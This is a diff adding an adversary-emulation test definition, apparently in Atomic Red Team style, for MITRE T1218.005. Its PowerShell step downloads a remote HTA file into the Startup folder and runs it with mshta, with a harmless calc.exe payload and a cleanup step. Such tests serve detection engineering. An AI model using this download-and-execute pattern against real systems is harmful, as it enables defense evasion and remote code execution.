@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Mshta Executes Remote HTML Application (HTA)
+description: |
+    Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
+args:
+    - name: temp_file
+      type: string
+      default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta
+    - name: hta_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
+uuid: c4b97eeb-5249-4455-a607-59f95485cb45
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.005: Mshta'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: mshta-executes-remote-html-application-(hta)
+      inline: |
+        $var =Invoke-WebRequest "{{.Args.hta_url}}"
+        $var.content|out-file "{{.Args.temp_file}}"
+        mshta "{{.Args.temp_file}}"
+        start-sleep -s 15
+        stop-process -name "calculator" -Force
+      executor: powershell
+      cleanup:
+        inline: |
+            remove-item "{{.Args.temp_file}}" -ErrorAction Ignore
+        executor: powershell
